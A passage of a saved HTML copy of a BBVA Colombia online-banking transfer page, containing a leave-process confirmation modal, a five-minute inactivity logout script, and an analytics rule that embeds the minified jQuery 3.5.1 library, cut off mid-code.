                let inp = $(document.getElementById("conoritaThemeform:cashFinderProduct"));

                if (inp.val().length === 0) {
                    if (!firstTry) {
                        myCommand();
                    }

                }
                firstTry = false;
            }
        </script>
            </div>
        </div><input type="hidden" name="javax.faces.ViewState" value="e2s1" autocomplete="off"></form><input type="hidden" name="javax.faces.ViewState" id="javax.faces.ViewState" value="e2s1">
</div>
<form id="j_idt316" name="j_idt316" method="post" action="https://nuevaversion.bbvanet.com.co/bbva/kqco_co_web/page/cashConversion/transfers?execution=e2s1" enctype="application/x-www-form-urlencoded">
<input type="hidden" name="j_idt316" value="j_idt316">

    <div class="modal modal-md out m-error" tabindex="-1" id="coronita-modal" role-dialog="">
        <div class="modal-dialog modal-sm" role="document">
            <div class="modal-content">
     
                <div class="modal-body">
                    <div class="row">
                        <div class="col-md-12 iconModal">
                            <img src="./plantilla_files/error.svg" alt="">
                        </div>
                        <h1>¿Estás seguro de querer salir del proceso?</h1>
                        <div class="col-md-12">
                            <p class="center">Se perderán los datos introducidos.</p>
                        </div>
                    </div>
                    <div class="row buttons ">
                        <div class="col-md-8 col-md-offset-2 twoButtons"><a id="j_idt316:j_idt321" href="https://nuevaversion.bbvanet.com.co/bbva/kqco_co_web/page/cashConversion/transfers?execution=e2s1#" class="ui-commandlink ui-widget btn btn-next submit-step-1 btnModalContinue btn-blue" onclick="document.getElementById(&#39;coronita-modal&#39;).style.display = &#39;none&#39;;;PrimeFaces.ab({s:&quot;j_idt316:j_idt321&quot;});return false;" type="button">
                                Continuar en el proceso
                            </a><a id="j_idt316:j_idt325" href="https://nuevaversion.bbvanet.com.co/bbva/kqco_co_web/page/cashConversion/transfers?execution=e2s1#" onclick="PrimeFaces.ab({s:this,e:&quot;action&quot;,p:&quot;j_idt316:j_idt325&quot;});;return false" class="submit-step-1 modify btn btn-nobackground">Salir del proceso</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div><input type="hidden" name="javax.faces.ViewState" id="javax.faces.ViewState" value="e2s1">
</form>
    
    <script type="text/javascript">
        /**
         * Funciones ini() stop() :: Realizan el control de inactividad en la pagina
         */
        var bean = 'com.bbva.net.front.controller.impl.CashConversionControllerImpl@18bfdc8';
        var url = (bean.indexOf('eProcessControllerImpl') !== -1)?'https://www.e-bbva.com.co/bbvaecm/kqco_co_web/page/logout':'https://nuevaversion.bbvanet.com.co/bbva/kqco_co_web/page/logout';
        var timer;
        var ini = function() {
            timer = setTimeout('location=url',300000); // 5 minutos
        }
        var stop = function() {
            clearTimeout(timer);
            timer = setTimeout('location=url',300000); // 5 minutos
        }
    </script>
    <script type="text/javascript" src="./plantilla_files/globalFunctions.js.descarga"></script>
    <script type="text/javascript" src="./plantilla_files/datalayer.min.js.descarga"></script>
    <script type="text/javascript" src="./plantilla_files/wurfl.js.descarga"></script>
    <script type="text/javascript" src="./plantilla_files/launch-e56687e117cf.min.js.descarga"></script><script>_satellite["_runScript1"](function(event, target, Promise) {
if(typeof(jQuery)=="undefined"){
/*! jQuery v3.5.1 | (c) JS Foundation and other contributors | jquery.org/license */
!function(e,t){"use strict";"object"==typeof module&&"object"==typeof module.exports?module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error("jQuery requires a window with a document");return t(e)}:t(e)}("undefined"!=typeof window?window:this,function(C,e){"use strict";var t=[],r=Object.getPrototypeOf,s=t.slice,g=t.flat?function(e){return t.flat.call(e)}:function(e){return t.concat.apply([],e)},u=t.push,i=t.indexOf,n={},o=n.toString,v=n.hasOwnProperty,a=v.toString,l=a.call(Object),y={},m=function(e){return"function"==typeof e&&"number"!=typeof e.nodeType},x=function(e){return null!=e&&e===e.window},E=C.document,c={type:!0,src:!0,nonce:!0,noModule:!0};function b(e,t,n){var r,i,o=(n=n||E).createElement("script");if(o.text=e,t)for(r in c)(i=t[r]||t.getAttribute&&t.getAttribute(r))&&o.setAttribute(r,i);n.head.appendChild(o).parentNode.removeChild(o)}function w(e){return null==e?e+"":"object"==typeof e||"function"==typeof e?n[o.call(e)]||"object":typeof e}var f="3.5.1",S=function(e,t){return new S.fn.init(e,t)};function p(e){var t=!!e&&"length"in e&&e.length,n=w(e);return!m(e)&&!x(e)&&("array"===n||0===t||"number"==typeof t&&0<t&&t-1 in e)}S.fn=S.prototype={jquery:f,constructor:S,length:0,toArray:function(){return s.call(this)},get:function(e){return null==e?s.call(this):e<0?this[e+this.length]:this[e]},pushStack:function(e){var t=S.merge(this.constructor(),e);return t.prevObject=this,t},each:function(e){return S.each(this,e)},map:function(n){return this.pushStack(S.map(this,function(e,t){return n.call(e,t,e)}))},slice:function(){return this.pushStack(s.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},even:function(){return this.pushStack(S.grep(this,function(e,t){return(t+1)%2}))},odd:function(){return this.pushStack(S.grep(this,function(e,t){return t%2}))},eq:function(e){var t=this.length,n=+e+(e<0?t:0);return this.pushStack(0<=n&&n<t?[this[n]]:[])},end:function(){return this.prevObject||this.constructor()},push:u,sort:t.sort,splice:t.splice},S.extend=S.fn.extend=function(){var e,t,n,r,i,o,a=arguments[0]||{},s=1,u=arguments.length,l=!1;for("boolean"==typeof a&&(l=a,a=arguments[s]||{},s++),"object"==typeof a||m(a)||(a={}),s===u&&(a=this,s--);s<u;s++)if(null!=(e=arguments[s]))for(t in e)r=e[t],"__proto__"!==t&&a!==r&&(l&&r&&(S.isPlainObject(r)||(i=Array.isArray(r)))?(n=a[t],o=i&&!Array.isArray(n)?[]:i||S.isPlainObject(n)?n:{},i=!1,a[t]=S.extend(l,o,r)):void 0!==r&&(a[t]=r));return a},S.extend({expando:"jQuery"+(f+Math.random()).replace(/\D/g,""),isReady:!0,error:function(e){throw new Error(e)},noop:function(){},isPlainObject:function(e){var t,n;return!(!e||"[object Object]"!==o.call(e))&&(!(t=r(e))||"function"==typeof(n=v.call(t,"constructor")&&t.constructor)&&a.call(n)===l)},isEmptyObject:function(e){var t;for(t in e)return!1;return!0},globalEval:function(e,t,n){b(e,{nonce:t&&t.nonce},n)},each:function(e,t){var n,r=0;if(p(e)){for(n=e.length;r<n;r++)if(!1===t.call(e[r],r,e[r]))break}else for(r in e)if(!1===t.call(e[r],r,e[r]))break;return e},makeArray:function(e,t){var n=t||[];return null!=e&&(p(Object(e))?S.merge(n,"string"==typeof e?[e]:e):u.call(n,e)),n},inArray:function(e,t,n){return null==t?-1:i.call(t,e,n)},merge:function(e,t){for(var n=+t.length,r=0,i=e.length;r<n;r++)e[i++]=t[r];return e.length=i,e},grep:function(e,t,n){for(var r=[],i=0,o=e.length,a=!n;i<o;i++)!t(e[i],i)!==a&&r.push(e[i]);return r},map:function(e,t,n){var r,i,o=0,a=[];if(p(e))for(r=e.length;o<r;o++)null!=(i=t(e[o],o,n))&&a.push(i);else for(o in e)null!=(i=t(e[o],o,n))&&a.push(i);return g(a)},guid:1,support:y}),"function"==typeof Symbol&&(S.fn[Symbol.iterator]=t[Symbol.iterator]),S.each("Boolean Number String Function Array Date RegExp Object Error Symbol".split(" "),function(e,t){n["[object "+t+"]"]=t.toLowerCase()});var d=function(n){var e,d,b,o,i,h,f,g,w,u,l,T,C,a,E,v,s,c,y,S="sizzle"+1*new Date,p=n.document,k=0,r=0,m=ue(),x=ue(),A=ue(),N=ue(),D=function(e,t){return e===t&&(l=!0),0},j={}.hasOwnProperty,t=[],q=t.pop,L=t.push,H=t.push,O=t.slice,P=function(e,t){for(var n=0,r=e.length;n<r;n++)if(e[n]===t)return n;return-1},R="checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",M="[\\x20\\t\\r\\n\\f]",I="(?:\\\\[\\da-fA-F]{1,6}"+M+"?|\\\\[^\\r\\n\\f]|[\\w-]|[^\0-\\x7f])+",W="\\["+M+"*("+I+")(?:"+M+"*([*^$|!~]?=)"+M+"*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|("+I+"))|)"+M+"*\\]",F=":("+I+")(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|"+W+")*)|.*)\\)|)",B=new RegExp(M+"+","g"),$=new RegExp("^"+M+"+|((?:^|[^\\\\])(?:\\\\.)*)"+M+"+$","g"),_=new RegExp("^"+M+"*,"+M+"*"),z=new RegExp("^"+M+"*([>+~]|"+M+")"+M+"*"),U=new RegExp(M+"|>"),X=new RegExp(F),V=new RegExp("^"+I+"$"),G={ID:new RegExp("^#("+I+")"),CLASS:new RegExp("^\\.("+I+")"),TAG:new RegExp("^("+I+"|[*])"),ATTR:new RegExp("^"+W),PSEUDO:new RegExp("^"+F),CHILD:new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\("+M+"*(even|odd|(([+-]|)(\\d*)n|)"+M+"*(?:([+-]|)"+M+"*(\\d+)|))"+M+"*\\)|)","i"),bool:new RegExp("^(?:"+R+")$","i"),needsContext:new RegExp("^"+M+"*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\("+M+"*((?:-\\d)?\\d*)"+M+"*\\)|)(?=[^-]|$)","i")},Y=/HTML$/i,Q=/^(?:input|select|textarea|button)$/i,J=/^h\d$/i,K=/^[^{]+\{\s*\[native \w/,Z=/^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,ee=/[+~]/,te=new RegExp("\\\\[\\da-fA-F]{1,6}"+M+"?|\\\\([^\\r\\n\\f])","g"),ne=function(e,t){var n="0x"+e.slice(1)-65536;return t||(n<0?String.fromCharCode(n+65536):String.fromCharCode(n>>10|55296,1023&n|56320))},re=/([\0-\x1f\x7f]|^-?\d)|^-$|[^\0-\x1f\x7f-\uFFFF\w-]/g,ie=function(e,t){return t?"\0"===e?"\ufffd":e.slice(0,-1)+"\\"+e.charCodeAt(e.length-1).toString(16)+" ":"\\"+e},oe=function(){T()},ae=be(function(e){return!0===e.disabled&&"fieldset"===e.nodeName.toLowerCase()},{dir:"parentNode",next:"legend"});try{H.apply(t=O.call(p.childNodes),p.childNodes),t[p.childNodes.length].nodeType}catch(e){H={apply:t.length?function(e,t){L.apply(e,O.call(t))}:function(e,t){var n=e.length,r=0;while(e[n++]=t[r++]);e.length=n-1}}}function se(t,e,n,r){var i,o,a,s,u,l,c,f=e&&e.ownerDocument,p=e?e.nodeType:9;if(n=n||[],"string"!=typeof t||!t||1!==p&&9!==p&&11!==p)return n;if(!r&&(T(e),e=e||C,E)){if(11!==p&&(u=Z.exec(t)))if(i=u[1]){if(9===p){if(!(a=e.getElementById(i)))return n;if(a.id===i)return n.push(a),n}else if(f&&(a=f.getElementById(i))&&y(e,a)&&a.id===i)return n.push(a),n}else{if(u[2])return H.apply(n,e.getElementsByTagName(t)),n;if((i=u[3])&&d.getElementsByClassName&&e.getElementsByClassName)return H.apply(n,e.getElementsByClassName(i)),n}if(d.qsa&&!N[t+" "]&&(!v||!v.test(t))&&(1!==p||"object"!==e.nodeName.toLowerCase())){if(c=t,f=e,1===p&&(U.test(t)||z.test(t))){(f=ee.test(t)&&ye(e.parentNode)||e)===e&&d.scope||((s=e.getAttribute("id"))?s=s.replace(re,ie):e.setAttribute("id",s=S)),o=(l=h(t)).length;while(o--)l[o]=(s?"#"+s:":scope")+" "+xe(l[o]);c=l.join(",")}try{return H.apply(n,f.querySelectorAll(c)),n}catch(e){N(t,!0)}finally{s===S&&e.removeAttribute("id")}}}return g(t.replace($,"$1"),e,n,r)}function ue(){var r=[];return function e(t,n){return r.push(t+" ")>b.cacheLength&&delete e[r.shift()],e[t+" "]=n}}function le(e){return e[S]=!0,e}function ce(e){var t=C.createElement("fieldset");try{return!!e(t)}catch(e){return!1}finally{t.parentNode&&t.parentNode.removeChild(t),t=null}}function fe(e,t){var n=e.split("|"),r=n.length;while(r--)b.attrHandle[n[r]]=t}function pe(e,t){var n=t&&e,r=n&&1===e.nodeType&&1===t.nodeType&&e.sourceIndex-t.sourceIndex;if(r)return r;if(n)while(n=n.nextSibling)if(n===t)return-1;return e?1:-1}function de(t){return function(e){return"input"===e.nodeName.toLowerCase()&&e.type===t}}function he(n){return function(e){var t=e.nodeName.toLowerCase();return("input"===t||"button"===t)&&e.type===n}}function ge(t){return function(e){return"form"in e?e.parentNode&&!1===e.disabled?"label"in e?"label"in e.parentNode?e.parentNode.disabled===t:e.disabled===t:e.isDisabled===t||e.isDisabled!==!t&&ae(e)===t:e.disabled===t:"label"in e&&e.disabled===t}}function ve(a){return le(function(o){return o=+o,le(function(e,t){var n,r=a([],e.length,o),i=r.length;while(i--)e[n=r[i]]&&(e[n]=!(t[n]=e[n]))})})}function ye(e){return e&&"undefined"!=typeof e.getElementsByTagName&&e}for(e in d=se.support={},i=se.isXML=function(e){var t=e.namespaceURI,n=(e.ownerDocument||e).documentElement;return!Y.test(t||n&&n.nodeName||"HTML")},T=se.setDocument=function(e){var t,n,r=e?e.ownerDocument||e:p;return r!=C&&9===r.nodeType&&r.documentElement&&(a=(C=r).documentElement,E=!i(C),p!=C&&(n=C.defaultView)&&n.top!==n&&(n.addEventListener?n.addEventListener("unload",oe,!1):n.attachEvent&&n.attachEvent("onunload",oe)),d.scope=ce(function(e){return a.appendChild(e).appendChild(C.createElement("div")),"undefined"!=typeof e.querySelectorAll&&!e.querySelectorAll(":scope fieldset div").length}),d.attributes=ce(function(e){return e.className="i",!e.getAttribute("className")}),d.getElementsByTagName=ce(function(e){return e.appendChild(C.createComment("")),!e.getElementsByTagName("*").length}),d.getElementsByClassName=K.test(C.getElementsByClassName),d.getById=ce(function(e){return a.appendChild(e).id=S,!C.getElementsByName||!C.getElementsByName(S).length}),d.getById?(b.filter.ID=function(e){var t=e.replace(te,ne);return function(e){return e.getAttribute("id")===t}},b.find.ID=function(e,t){if("undefined"!=typeof t.getElementById&&E){var n=t.getElementById(e);return n?[n]:[]}}):(b.filter.ID=function(e){var n=e.replace(te,ne);return function(e){var t="undefined"!=typeof e.getAttributeNode&&e.getAttributeNode("id");return t&&t.value===n}},b.find.ID=function(e,t){if("undefined"!=typeof t.getElementById&&E){var n,r,i,o=t.getElementById(e);if(o){if((n=o.getAttributeNode("id"))&&n.value===e)return[o];i=t.getElementsByName(e),r=0;while(o=i[r++])if((n=o.getAttributeNode("id"))&&n.value===e)return[o]}return[]}}),b.find.TAG=d.getElementsByTagName?function(e,t){return"undefined"!=typeof t.getElementsByTagName?t.getElementsByTagName(e):d.qsa?t.querySelectorAll(e):void 0}:function(e,t){var n,r=[],i=0,o=t.getElementsByTagName(e);if("*"===e){while(n=o[i++])1===n.nodeType&&r.push(n);return r}return o},b.find.CLASS=d.getElementsByClassName&&function(e,t){if("undefined"!=typeof t.getElementsByClassName&&E)return t.getElementsByClassName(e)},s=[],v=[],(d.qsa=K.test(C.querySelectorAll))&&(ce(function(e){var t;a.appendChild(e).innerHTML="<a id='"+S+"'></a><select id='"+S+"-\r\\' msallowcapture=''><option selected=''></option></select>",e.querySelectorAll("[msallowcapture^='']").length&&v.push("[*^$]="+M+"*(?:''|\"\")"),e.querySelectorAll("[selected]").length||v.push("\\["+M+"*(?:value|"+R+")"),e.querySelectorAll("[id~="+S+"-]").length||v.push("~="),(t=C.createElement("input")).setAttribute("name",""),e.appendChild(t),e.querySelectorAll("[name='']").length||v.push("\\["+M+"*name"+M+"*="+M+"*(?:''|\"\")"),e.querySelectorAll(":checked").length||v.push(":checked"),e.querySelectorAll("a#"+S+"+*").length||v.push(".#.+[+~]"),e.querySelectorAll("\\\f"),v.push("[\\r\\n\\f]")}),ce(function(e){e.innerHTML="<a href='' disabled='disabled'></a><select disabled='disabled'><option/></select>";var t=C.createElement("input");t.setAttribute("type","hidden"),e.appendChild(t).setAttribute("name","D"),e.querySelectorAll("[name=d]").length&&v.push("name"+M+"*[*^$|!~]?="),2!==e.querySelectorAll(":enabled").length&&v.push(":enabled",":disabled"),a.appendChild(e).disabled=!0,2!==e.querySelectorAll(":disabled").length&&v.push(":enabled",":disabled"),e.querySelectorAll("*,:x"),v.push(",.*:")})),(d.matchesSelector=K.test(c=a.matches||a.webkitMatchesSelector||a.mozMatchesSelector||a.oMatchesSelector||a.msMatchesSelector))&&ce(function(e){d.disconnectedMatch=c.call(e,"*"),c.call(e,"[s!='']:x"),s.push("!=",F)}),v=v.length&&new RegExp(v.join("|")),s=s.length&&new RegExp(s.join("|")),t=K.test(a.compareDocumentPosition),y=t||K.test(a.contains)?function(e,t){var n=9===e.nodeType?e.documentElement:e,r=t&&t.parentNode;return e===r||!(!r||1!==r.nodeType||!(n.contains?n.contains(r):e.compareDocumentPosition&&16&e.compareDocumentPosition(r)))}:function(e,t){if(t)while(t=t.parentNode)if(t===e)return!0;return!1},D=t?function(e,t){if(e===t)return l=!0,0;var n=!e.compareDocumentPosition-!t.compareDocumentPosition;return n||(1&(n=(e.ownerDocument||e)==(t.ownerDocument||t)?e.compareDocumentPosition(t):1)||!d.sortDetached&&t.compareDocumentPosition(e)===n?e==C||e.ownerDocument==p&&y(p,e)?-1:t==C||t.ownerDocument==p&&y(p,t)?1:u?P(u,e)-P(u,t):0:4&n?-1:1)}:function(e,t){if(e===t)return l=!0,0;var n,r=0,i=e.parentNode,o=t.parentNode,a=[e],s=[t];if(!i||!o)return e==C?-1:t==C?1:i?-1:o?1:u?P(u,e)-P(u,t):0;if(i===o)return pe(e,t);n=e;while(n=n.parentNode)a.unshift(n);n=t;while(n=n.parentNode)s.unshift(n);while(a[r]===s[r])r++;return r?pe(a[r],s[r]):a[r]==p?-1:s[r]==p?1:0}),C},se.matches=function(e,t){return se(e,null,null,t)},se.matchesSelector=function(e,t){if(T(e),d.matchesSelector&&E&&!N[t+" "]&&(!s||!s.test(t))&&(!v||!v.test(t)))try{var n=c.call(e,t);if(n||d.disconnectedMatch||e.document&&11!==e.document.nodeType)return n}catch(e){N(t,!0)}return 0<se(t,C,null,[e]).length},se.contains=function(e,t){return(e.ownerDocument||e)!=C&&T(e),y(e,t)},se.attr=function(e,t){(e.ownerDocument||e)!=C&&T(e);var n=b.attrHandle[t.toLowerCase()],r=n&&j.call(b.attrHandle,t.toLowerCase())?n(e,t,!E):void 0;return void 0!==r?r:d.attributes||!E?e.getAttribute(t):(r=e.getAttributeNode(t))&&r.specified?r.value:null},se.escape=function(e){return(e+"").replace(re,ie)},se.error=function(e){throw new Error("Syntax error, unrecognized expression: "+e)},se.uniqueSort=function(e){var t,n=[],r=0,i=0;if(l=!d.detectDuplicates,u=!d.sortStable&&e.slice(0),e.sort(D),l){while(t=e[i++])t===e[i]&&(r=n.push(i));while(r--)e.splice(n[r],1)}return u=null,e},o=se.getText=function(e){var t,n="",r=0,i=e.nodeType;if(i){if(1===i||9===i||11===i){if("string"==typeof e.textContent)return e.textContent;for(e=e.firstChild;e;e=e.nextSibling)n+=o(e)}else if(3===i||4===i)return e.nodeValue}else while(t=e[r++])n+=o(t);return n},(b=se.selectors={cacheLength:50,createPseudo:le,match:G,attrHandle:{},find:{},relative:{">":{dir:"parentNode",first:!0}," ":{dir:"parentNode"},"+":{dir:"previousSibling",first:!0},"~":{dir:"previousSibling"}},preFilter:{ATTR:function(e){return e[1]=e[1].replace(te,ne),e[3]=(e[3]||e[4]||e[5]||"").replace(te,ne),"~="===e[2]&&(e[3]=" "+e[3]+" "),e.slice(0,4)},CHILD:function(e){return e[1]=e[1].toLowerCase(),"nth"===e[1].slice(0,3)?(e[3]||se.error(e[0]),e[4]=+(e[4]?e[5]+(e[6]||1):2*("even"===e[3]||"odd"===e[3])),e[5]=+(e[7]+e[8]||"odd"===e[3])):e[3]&&se.error(e[0]),e},PSEUDO:function(e){var t,n=!e[6]&&e[2];return G.CHILD.test(e[0])?null:(e[3]?e[2]=e[4]||e[5]||"":n&&X.test(n)&&(t=h(n,!0))&&(t=n.indexOf(")",n.length-t)-n.length)&&(e[0]=e[0].slice(0,t),e[2]=n.slice(0,t)),e.slice(0,3))}},filter:{TAG:function(e){var t=e.replace(te,ne).toLowerCase();return"*"===e?function(){return!0}:function(e){return e.nodeName&&e.nodeName.toLowerCase()===t}},CLASS:function(e){var t=m[e+" "];return t||(t=new RegExp("(^|"+M+")"+e+"("+M+"|$)"))&&m(e,function(e){return t.test("string"==typeof e.className&&e.className||"undefined"!=typeof e.getAttribute&&e.getAttribute("class")||"")})},ATTR:function(n,r,i){return function(e){var t=se.attr(e,n);return null==t?"!="===r:!r||(t+="","="===r?t===i:"!="===r?t!==i:"^="===r?i&&0===t.indexOf(i):"*="===r?i&&-1<t.indexOf(i):"$="===r?i&&t.slice(-i.length)===i:"~="===r?-1<(" "+t.replace(B," ")+" ").indexOf(i):"|="===r&&(t===i||t.slice(0,i.length+1)===i+"-"))}},CHILD:function(h,e,t,g,v){var y="nth"!==h.slice(0,3),m="last"!==h.slice(-4),x="of-type"===e;return 1===g&&0===v?function(e){return!!e.parentNode}:function(e,t,n){var r,i,o,a,s,u,l=y!==m?"nextSibling":"previousSibling",c=e.parentNode,f=x&&e.nodeName.toLowerCase(),p=!n&&!x,d=!1;if(c){if(y){while(l){a=e;while(a=a[l])if(x?a.nodeName.toLowerCase()===f:1===a.nodeType)return!1;u=l="only"===h&&!u&&"nextSibling"}return!0}if(u=[m?c.firstChild:c.lastChild],m&&p){d=(s=(r=(i=(o=(a=c)[S]||(a[S]={}))[a.uniqueID]||(o[a.uniqueID]={}))[h]||[])[0]===k&&r[1])&&r[2],a=s&&c.childNodes[s];while(a=++s&&a&&a[l]||(d=s=0)||u.pop())if(1===a.nodeType&&++d&&a===e){i[h]=[k,s,d];break}}else if(p&&(d=s=(r=(i=(o=(a=e)[S]||(a[S]={}))[a.uniqueID]||(o[a.uniqueID]={}))[h]||[])[0]===k&&r[1]),!1===d)while(a=++s&&a&&a[l]||(d=s=0)||u.pop())if((x?a.nodeName.toLowerCase()===f:1===a.nodeType)&&++d&&(p&&((i=(o=a[S]||(a[S]={}))[a.uniqueID]||(o[a.uniqueID]={}))[h]=[k,d]),a===e))break;return(d-=v)===g||d%g==0&&0<=d/g}}},PSEUDO:function(e,o){var t,a=b.pseudos[e]||b.setFilters[e.toLowerCase()]||se.error("unsupported pseudo: "+e);return a[S]?a(o):1<a.length?(t=[e,e,"",o],b.setFilters.hasOwnProperty(e.toLowerCase())?le(function(e,t){var n,r=a(e,o),i=r.length;while(i--)e[n=P(e,r[i])]=!(t[n]=r[i])}):function(e){return a(e,0,t)}):a}},pseudos:{not:le(function(e){var r=[],i=[],s=f(e.replace($,"$1"));return s[S]?le(function(e,t,n,r){var i,o=s(e,null,r,[]),a=e.length;while(a--)(i=o[a])&&(e[a]=!(t[a]=i))}):function(e,t,n){return r[0]=e,s(r,null,n,i),r[0]=null,!i.pop()}}),has:le(function(t){return function(e){return 0<se(t,e).length}}),contains:le(function(t){return t=t.replace(te,ne),function(e){return-1<(e.textContent||o(e)).indexOf(t)}}),lang:le(function(n){return V.test(n||"")||se.error("unsupported lang: "+n),n=n.replace(te,ne).toLowerCase(),function(e){var t;do{if(t=E?e.lang:e.getAttribute("xml:lang")||e.getAttribute("lang"))return(t=t.toLowerCase())===n||0===t.indexOf(n+"-")}while((e=e.parentNode)&&1===e.nodeType);return!1}}),target:function(e){var t=n.location&&n.location.hash;return t&&t.slice(1)===e.id},root:function(e){return e===a},focus:function(e){return e===C.activeElement&&(!C.hasFocus||C.hasFocus())&&!!(e.type||e.href||~e.tabIndex)},enabled:ge(!1),disabled:ge(!0),checked:function(e){var t=e.nodeName.toLowerCase();return"input"===t&&!!e.checked||"option"===t&&!!e.selected},selected:function(e){return e.parentNode&&e.parentNode.selectedIndex,!0===e.selected},empty:function(e){for(e=e.firstChild;e;e=e.nextSibling)if(e.nodeType<6)return!1;return!0},parent:function(e){return!b.pseudos.empty(e)},header:function(e){return J.test(e.nodeName)},input:function(e){return Q.test(e.nodeName)},button:function(e){var t=e.nodeName.toLowerCase();return"input"===t&&"button"===e.type||"button"===t},text:function(e){var t;return"input"===e.nodeName.toLowerCase()&&"text"===e.type&&(null==(t=e.getAttribute("type"))||"text"===t.toLowerCase())},first:ve(function(){return[0]}),last:ve(function(e,t){return[t-1]}),eq:ve(function(e,t,n){return[n<0?n+t:n]}),even:ve(function(e,t){for(var n=0;n<t;n+=2)e.push(n);return e}),odd:ve(function(e,t){for(var n=1;n<t;n+=2)e.push(n);return e}),lt:ve(function(e,t,n){for(var r=n<0?n+t:t<n?t:n;0<=--r;)e.push(r);return e}),gt:ve(function(e,t,n){for(var r=n<0?n+t:n;++r<t;)e.push(r);return e})}}).pseudos.nth=b.pseudos.eq,{radio:!0,checkbox:!0,file:!0,password:!0,image:!0})b.pseudos[e]=de(e);for(e in{submit:!0,reset:!0})b.pseudos[e]=he(e);function me(){}function xe(e){for(var t=0,n=e.length,r="";t<n;t++)r+=e[t].value;return r}function be(s,e,t){var u=e.dir,l=e.next,c=l||u,f=t&&"parentNode"===c,p=r++;return e.first?function(e,t,n){while(e=e[u])if(1===e.nodeType||f)return s(e,t,n);return!1}:function(e,t,n){var r,i,o,a=[k,p];if(n){while(e=e[u])if((1===e.nodeType||f)&&s(e,t,n))return!0}else while(e=e[u])if(1===e.nodeType||f)if(i=(o=e[S]||(e[S]={}))[e.uniqueID]||(o[e.uniqueID]={}),l&&l===e.nodeName.toLowerCase())e=e[u]||e;else{if((r=i[c])&&r[0]===k&&r[1]===p)return a[2]=r[2];if((i[c]=a)[2]=s(e,t,n))return!0}return!1}}function we(i){return 1<i.length?function(e,t,n){var r=i.length;while(r--)if(!i[r](e,t,n))return!1;return!0}:i[0]}function Te(e,t,n,r,i){for(var o,a=[],s=0,u=e.length,l=null!=t;s<u;s++)(o=e[s])&&(n&&!n(o,r,i)||(a.push(o),l&&t.push(s)));return a}function Ce(d,h,g,v,y,e){return v&&!v[S]&&(v=Ce(v)),y&&!y[S]&&(y=Ce(y,e)),le(function(e,t,n,r){var i,o,a,s=[],u=[],l=t.length,c=e||function(e,t,n){for(var r=0,i=t.length;r<i;r++)se(e,t[r],n);return n}(h||"*",n.nodeType?[n]:n,[]),f=!d||!e&&h?c:Te(c,s,d,n,r),p=g?y||(e?d:l||v)?[]:t:f;if(g&&g(f,p,n,r),v){i=Te(p,u),v(i,[],n,r),o=i.length;while(o--)(a=i[o])&&(p[u[o]]=!(f[u[o]]=a))}if(e){if(y||d){if(y){i=[],o=p.length;while(o--)(a=p[o])&&i.push(f[o]=a);y(null,p=[],i,r)}o=p.length;while(o--)(a=p[o])&&-1<(i=y?P(e,a):s[o])&&(e[i]=!(t[i]=a))}}else p=Te(p===t?p.splice(l,p.length):p),y?y(null,t,p,r):H.apply(t,p)})}function Ee(e){for(var i,t,n,r=e.length,o=b.relative[e[0].type],a=o||b.relative[" "],s=o?1:0,u=be(function(e){return e===i},a,!0),l=be(function(e){return-1<P(i,e)},a,!0),c=[function(e,t,n){var r=!o&&(n||t!==w)||((i=t).nodeType?u(e,t,n):l(e,t,n));return i=null,r}];s<r;s++)if(t=b.relative[e[s].type])c=[be(we(c),t)];else{if((t=b.filter[e[s].type].apply(null,e[s].matches))[S]){for(n=++s;n<r;n++)if(b.relative[e[n].type])break;return Ce(1<s&&we(c),1<s&&xe(e.slice(0,s-1).concat({value:" "===e[s-2].type?"*":""})).replace($,"$1"),t,s<n&&Ee(e.slice(s,n)),n<r&&Ee(e=e.slice(n)),n<r&&xe(e))}c.push(t)}return we(c)}return me.prototype=b.filters=b.pseudos,b.setFilters=new me,h=se.tokenize=function(e,t){var n,r,i,o,a,s,u,l=x[e+" "];if(l)return t?0:l.slice(0);a=e,s=[],u=b.preFilter;while(a){for(o in n&&!(r=_.exec(a))||(r&&(a=a.slice(r[0].length)||a),s.push(i=[])),n=!1,(r=z.exec(a))&&(n=r.shift(),i.push({value:n,type:r[0].replace($," ")}),a=a.slice(n.length)),b.filter)!(r=G[o].exec(a))||u[o]&&!(r=u[o](r))||(n=r.shift(),i.push({value:n,type:o,matches:r}),a=a.slice(n.length));if(!n)break}return t?a.length:a?se.error(e):x(e,s).slice(0)},f=se.compile=function(e,t){var n,v,y,m,x,r,i=[],o=[],a=A[e+" "];if(!a){t||(t=h(e)),n=t.length;while(n--)(a=Ee(t[n]))[S]?i.push(a):o.push(a);(a=A(e,(v=o,m=0<(y=i).length,x=0<v.length,r=function(e,t,n,r,i){var o,a,s,u=0,l="0",c=e&&[],f=[],p=w,d=e||x&&b.find.TAG("*",i),h=k+=null==p?1:Math.random()||.1,g=d.length;for(i&&(w=t==C||t||i);l!==g&&null!=(o=d[l]);l++){if(x&&o){a=0,t||o.ownerDocument==C||(T(o),n=!E);while(s=v[a++])if(s(o,t||C,n)){r.push(o);break}i&&(k=h)}m&&((o=!s&&o)&&u--,e&&c.push(o))}if(u+=l,m&&l!==u){a=0;while(s=y[a++])s(c,f,t,n);if(e){if(0<u)while(l--)c[l]||f[l]||(f[l]=q.call(r));f=Te(f)}H.apply(r,f),i&&!e&&0<f.length&&1<u+y.length&&se.uniqueSort(r)}return i&&(k=h,w=p),c},m?le(r):r))).selector=e}return a},g=se.select=function(e,t,n,r){var i,o,a,s,u,l="function"==typeof e&&e,c=!r&&h(e=l.selector||e);if(n=n||[],1===c.length){if(2<(o=c[0]=c[0].slice(0)).length&&"ID"===(a=o[0]).type&&9===t.nodeType&&E&&b.relative[o[1].type]){if(!(t=(b.find.ID(a.matches[0].replace(te,ne),t)||[])[0]))return 